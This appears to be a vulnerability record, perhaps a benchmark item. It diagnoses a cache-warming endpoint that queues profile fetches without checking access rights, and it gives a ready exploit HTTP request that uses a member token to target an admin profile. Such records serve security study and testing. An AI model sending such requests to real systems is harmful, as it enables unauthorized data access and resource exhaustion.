diagnosis: The WarmProfile worker receives tasks to fetch user profile data and populate cache keys based on TargetProfileID without evaluating relationship or access rights. An attacker can enqueue warming jobs for arbitrary user profiles, consuming database connections and exhausting memory resources.
exploit_request:
POST /api/cache/warm HTTP/1.1
Host: internal-tools.socialnet.com
Authorization: Bearer member_token_71
Content-Type: application/json

{"target_profile_id": "prof_admin_410"}
